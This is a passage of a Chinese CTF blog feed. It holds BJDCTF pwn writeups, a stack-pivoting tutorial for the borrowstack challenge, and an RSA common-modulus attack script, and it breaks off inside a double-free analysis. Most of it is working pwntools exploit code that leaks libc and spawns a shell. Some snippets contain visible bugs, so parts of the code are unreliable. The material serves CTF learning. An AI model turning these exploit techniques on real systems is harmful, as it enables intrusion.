漏洞</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29570</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./r2t3&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./r2t3&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./r2t3&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x11</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload += p32(<span class="number">0x8048430</span>)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(<span class="number">0x8048760</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">256</span>+<span class="number">6</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;My&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><p>感觉在哪里见过？</p><p>开局给提示：printf 函数地址，然后要求输入，输入完成后，会执行输入地址。所以依据给出地址计算 offset ，算出 one_gadget 真实地址输入。</p><p>one_gadget 输入应该是十进制数，一开始 p64() ，做不出来。</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./one_gadget&quot;</span>)</span><br><span class="line">elf= ELF(<span class="string">&quot;./one_gadget&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.29.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;u:&quot;</span>)</span><br><span class="line">printf_got = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;printf_got:&quot;</span>+<span class="built_in">hex</span>(printf_got))</span><br><span class="line"></span><br><span class="line">libc_base = printf_got - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0x106ef8</span> </span><br><span class="line">log.success(<span class="string">&quot;one_gadget:&quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;gadget:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>官方WP</strong>：<a href="https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2020%E7%AC%AC%E4%BA%8C%E5%B1%8ABJDCTF">https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2020%E7%AC%AC%E4%BA%8C%E5%B1%8ABJDCTF</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> BJDCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈迁移学习（新）</title>
      <link href="archives/d7d152e1/"/>
      <url>archives/d7d152e1/</url>
      
        <content type="html"><![CDATA[<h1 id="栈迁移学习（新）"><a href="#栈迁移学习（新）" class="headerlink" title="栈迁移学习（新）"></a>栈迁移学习（新）</h1><blockquote><p>2020年7月4日 更新：</p><p>题目在buu上有实验环境，名字是：gyctf_2020_borrowstack</p><p>前面刚总结完的笔记感觉不太完善，然后再做了题后，理解更加透彻，重新整理一下。</p></blockquote><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>当存在栈溢出且可溢出长度不足以容纳 payload 时，可采用栈迁移。一般这种情况下，溢出仅能覆盖 ebp 、 eip 。因为原来的栈空间不足，所以要构建一个新的栈空间放下 payload ，因此称为栈迁移。</p><h2 id="大概原理"><a href="#大概原理" class="headerlink" title="大概原理"></a>大概原理</h2><p>首先栈执行命令是从 esp 开始向 ebp 方向逐条执行，也就是从低地址到高地址逐条执行。触发栈迁移的关键指令：<code>leave|ret</code>，等效于<code>mov esp ebp; pop ebp; ret;</code>，作用是将 ebp 赋值给 esp ，并弹出 ebp 。</p><p>正常情况下退出栈时，esp 指向 ebp 所在位置，ebp 指向 ebp 所存储的位置。等同于执行一个 leave ret 的效果。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200311172814.png"></p><p>栈迁移：通过直接控制 ebp 的值，借助 leave 指令，间接控制  esp 的值。从上图可见，正常退出 esp 会指向原 ebp 位置。如果我们覆盖 eip 再次执行 leave 指令，esp 将会指向 0x400a0 的位置（ebp 将指向当前 ebp 存储的地址），也就是将栈迁移到 0x400a0 。通过提前布置 ebp 中的地址和调用 leave 指令，可完成连续多次栈迁移。</p><p>在上图中也可以看出，栈迁移的地址信息被提前写入，所以明确并提前计算栈被迁移到的内存地址，是栈迁移的关键。当然也是有骚操作，可不提前写入的，详情看下面题目分析。</p><p>在我看来，栈迁移不能算是在内存地址中创建了一个完整的栈结构，而是复刻了栈从高地址到低地址依次执行命令的功能。因为一般情况下多次栈迁移，ebp 地址与 esp 地址关系比较奇怪，ebp 地址会比 esp 低，特别是最后一次栈迁移，ebp 的值不再重要，可被指向到奇奇怪怪的地址，这不相当于没有 ebp 的栈么。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote><p>题目来自 i春秋新春战役 borrowstack</p></blockquote><h3 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h3><p>只打开 NX 保护的64 位程序。程序内容为：提示输入两次。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=3d3f6ef2905eff37d82ebb1bfa6e7c4e75384eff, not stripped</span><br><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>第一处提示输入存在溢出，可溢出 0x10 ，仅可以覆盖 ebp、eip 。第二处输入允许向 bank 写入 0x100 字节，bank 位于 bss 段头。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;amp;s);</span><br><span class="line">  read(<span class="number">0</span>, &amp;amp;buf, <span class="number">0x70</span>uLL);<span class="comment">//可溢出0x10字节</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!You can check and use your borrow stack now!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;amp;bank, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这条题目目的就是引导我们将栈迁移到 bss 段，并且为我们预留了写入 bss 段的函数。</p><p>这里插一嘴，如果没有这个预留函数，但是可以溢出更长又不足够放下 payload（如：0x30）怎么解决？控制 eip 构建一个写入函数，然后才再调用指令 leave 。（该套路题目：<a href="https://github.com/scwuaptx/HITCON-Training">HITCON-Training-master lab6</a>）</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>最最最普通的，没有骚操作的栈迁移题目（也就是本题），会进行两次栈迁移。第一次迁移泄露 libc 基地址，并且为第二次执行 one_gadget 之类 get shell。</p><p><strong>大概攻击流程</strong></p><ol><li>栈溢出控制 ebp 为第一次栈迁移做准备，控制 eip 再次执行 leave 指令。</li><li>写入第一次迁移的栈数据，功能需要有：泄露 libc 基地址，为第二次迁移做准备。</li><li>第二次迁移的栈执行 one_gadget 。</li></ol><p>栈溢出的话问题不大，在第一次 read 写入 0x60 就到 ebp ，然后按需覆盖就可以。比如说我决定将第一次栈迁移到 bank+0x90 ，那么 ebp 就覆盖为 bank+0x90 。调准地址明确了，下一步就需要触发栈迁移了，也就是在执行一次 leave 指令，通过覆写 eip 为 leave 。(bank地址为0x601080 ， leave地址为0x400699)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload_0 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload_0 += bank+<span class="number">0x90</span></span><br><span class="line">payload_0 += leave</span><br></pre></td></tr></table></figure><p>第一次栈迁移外部准备完成，就需要向 bank+0x90 写入需要执行的代码。这道题是利用的是第二次 read 输入 stack 1 数据。前面说过，需要进行两次迁移，所以在输入 stack 1 数据要考虑第二次栈迁移的地址，我选择 bank+0x60 。</p><p>在 stack 1 需要泄露出 libc 基地址，写入stack 2 数据。泄露地址就选择一个函数真实地址输出并计算偏移，然后调用 main 函数中的 read2 写入 stack 2 ，因为顺序执行，因此还执行了一次 leave （即 main 函数从 read2 开始运行一遍），触发第二次栈迁移。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload_1 = <span class="string">&#x27;\0&#x27;</span>*<span class="number">0x90</span><span class="comment">#填充到bank+0x90</span></span><br><span class="line">payload_1 += p64(bank+<span class="number">0x60</span>)<span class="comment">#stack2地址</span></span><br><span class="line">payload_1 += p64(pop_rdi)<span class="comment">#传参</span></span><br><span class="line">payload_1 += p64(puts_got)<span class="comment">#泄露函数</span></span><br><span class="line">payload_1 += p64(puts_plt)</span><br><span class="line">payload_1 += p64(<span class="number">0x400680</span>)<span class="comment">#main中的read2&amp;amp;leave</span></span><br></pre></td></tr></table></figure><p>stack 1 准备完成，并且为 stack 2 预留写入函数，接下来就是处理并写入 stack 2 。因为这个栈已经是最后一个栈，所以不需要关心 ebp 的值，我给它赋值 0xdeadbeef 。</p><p>如果遇到有的题目需要3 次、 4 次等多次迁移，就将 ebp 赋值为下一次迁移的地址，直到最后一次。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">libc_base=u64(p.recv(<span class="number">6</span>)[:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]<span class="comment">#泄露libc基地址</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span><span class="comment">#填充到bank+0x60</span></span><br><span class="line">payload_2 += p64(<span class="number">0xdeadbeef</span>)<span class="comment">#ebp值</span></span><br><span class="line">payload += p64(one_gadget+libc_base)<span class="comment">#one_gadget</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>填充跳转示意图：</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200311153802.png"></p><p>完整 exp </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./borrowstack&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./borrowstack&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">bank = <span class="number">0x601080</span></span><br><span class="line">pop_rdi = <span class="number">0x400703</span></span><br><span class="line">leave = <span class="number">0x400699</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget = <span class="number">0xf02a4</span></span><br><span class="line"></span><br><span class="line">payload_0 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload_0 += p64(bank+<span class="number">0x90</span>) + p64(leave)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;want&#x27;</span>)</span><br><span class="line">p.send(payload_0)</span><br><span class="line"></span><br><span class="line">payload_1=<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x90</span>+p64(bank+<span class="number">0x60</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)</span><br><span class="line">payload_1+=p64(<span class="number">0x0400680</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;now!\n&#x27;</span>,payload_1)</span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>)[:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="string">&quot;one:&quot;</span>+<span class="built_in">hex</span>(libc_base+one_gadget))</span><br><span class="line"></span><br><span class="line">payload_2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0xdeadbeef</span>)+p64(one_gadget+libc_base)</span><br><span class="line">p.sendline(payload_2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前面提到过，多次连续栈迁移需要提前明确每次栈空间地址。就好像上面那题目，stack 2 地址在写入 stack 1 数据的一并写入。其实 stack 2 地址也可以在执行 stack 1 的时候再写入。但一定要注意：执行的命令写入位置是在 esp + 0x8 位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload_1 = <span class="string">&#x27;\0&#x27;</span>*<span class="number">0x90</span><span class="comment">#填充到bank+0x90</span></span><br><span class="line">payload_1 += <span class="string">&#x27;\0&#x27;</span>*<span class="number">0x8</span><span class="comment">#填充（原应写入ebp）</span></span><br><span class="line">payload_1 += p64(pop_rdi)<span class="comment">#传参</span></span><br><span class="line">payload_1 += p64(puts_got)<span class="comment">#泄露函数</span></span><br><span class="line">payload_1 += p64(puts_plt)</span><br><span class="line"></span><br><span class="line">payload_1 += p64(pop_ebp)<span class="comment">#传参ebp</span></span><br><span class="line">payload_1 += p64(bank+<span class="number">0x60</span>)<span class="comment">#stack 2</span></span><br><span class="line"></span><br><span class="line">payload_1 += p64(<span class="number">0x400680</span>)<span class="comment">#main中的read2&amp;amp;leave</span></span><br></pre></td></tr></table></figure><p>32 位是栈传参；64 位前 6 个参数是寄存器传参，后面的栈传参 <a href="http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/">Link</a> 。</p><p><strong>能不能用 system(‘/bin/sh’) ？</strong></p><p>理论上可行，都只控制程序流。但实际上 bss 隔壁就是 got 表地址，如果调用函数层级很多，需要大量栈空间就可能会覆盖掉 got 表，从而导致错误。我尝试将第一次迁移地址定为 bank+0x90 ，第二次迁移地址定位 bank+0x80 ，在第二次迁移位置正确写入 system(‘/bin/sh’) 。执行到 system 中的 <code>&lt;do_system+157&gt;    call   sigaction</code> 时，got 表被覆盖一部分，而报错退出。第二次迁移位置不能在高地址移动了，所以使用 onegadget 。onegadget 更省内存空间。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>栈迁移可以用在栈溢出但是空间不足的情况下，构建虚拟栈空间。</p><p>栈迁移通过直接直接控制 ebp 来间接控制 esp ，实现关键指令（函数）为 leave 或其他可以将 ebp 赋值给 esp 的指令。</p><p>栈迁移构建的虚拟栈，不算是一个完整的栈，更像是栈的顺序执行结构，因为 esp 与 ebp 之间关系可能会异于正常。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 栈迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋新春战疫WriteUp</title>
      <link href="archives/d5e789b1/"/>
      <url>archives/d5e789b1/</url>
      
        <content type="html"><![CDATA[<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="1-easy-rsa"><a href="#1-easy-rsa" class="headerlink" title="1. easy_rsa"></a>1. easy_rsa</h3><p>下载附件，内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657</span></span><br><span class="line">e1 = <span class="number">464857</span></span><br><span class="line">e2 = <span class="number">190529</span></span><br><span class="line">c1 = <span class="number">21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531</span></span><br><span class="line">c2 = <span class="number">9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一个 n 两个 e 两个 c ，判断为 RSA  共模攻击，上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#RSA 共模攻击脚本</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s, s2n</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扩展欧几里得算法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">  n = <span class="number">27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657</span></span><br><span class="line">  c1 = <span class="number">21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531</span></span><br><span class="line">  c2 = <span class="number">9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664</span></span><br><span class="line">  e1 = <span class="number">464857</span></span><br><span class="line">  e2 = <span class="number">190529</span></span><br><span class="line">  s = egcd(e1, e2)</span><br><span class="line">  s1 = s[<span class="number">1</span>]</span><br><span class="line">  s2 = s[<span class="number">2</span>]</span><br><span class="line">  <span class="comment"># 求模反元素</span></span><br><span class="line">  <span class="keyword">if</span> s1 &amp;lt; <span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = invert(c1, n)</span><br><span class="line">  <span class="keyword">elif</span> s2 &amp;lt; <span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = invert(c2, n)</span><br><span class="line"></span><br><span class="line">  m = <span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n</span><br><span class="line">  print(n2s(m))  <span class="comment"># 二进制转string</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == &amp;<span class="comment">#039;__main__&amp;#039;:</span></span><br><span class="line">  main()</span><br></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Some-thing-exceting"><a href="#Some-thing-exceting" class="headerlink" title="Some_thing_exceting"></a>Some_thing_exceting</h3><p>64 位打开 Canary、NX ，菜单式程序，基本增<del>删</del>查改功能。creat 函数内发现数据结构体，允许 size 为 1~112 ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Banala</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *ba;</span><br><span class="line">    <span class="keyword">char</span> *na</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞为 double free ，位于 delete 函数，free 后没有归零指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;quot;#######################&amp;quot;);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;quot;#    Delete Banana    #&amp;quot;);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;quot;#---------------------#&amp;quot;);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;quot;&amp;gt; Banana ID : &amp;quot;);</span><br><span class="line">  _isoc99_scanf((__int64)&amp;quot;%d&amp;quot;, (__int64)&amp;amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp;lt; <span class="number">0</span> || v1 &amp;gt; <span class="number">10</span> || !ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;quot;Emmmmmm!Maybe you want Fool me!&amp;quot;);</span><br><span class="line">    goodbye();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(*(<span class="keyword">void</span> **)ptr[v1]);                      <span class="comment">// free ba</span></span><br><span class="line">  <span class="built_in">free</span>(*((<span class="keyword">void</span> **)ptr[v1] + <span class="number">1</span>));                <span class="comment">// free na</span></span><br><span 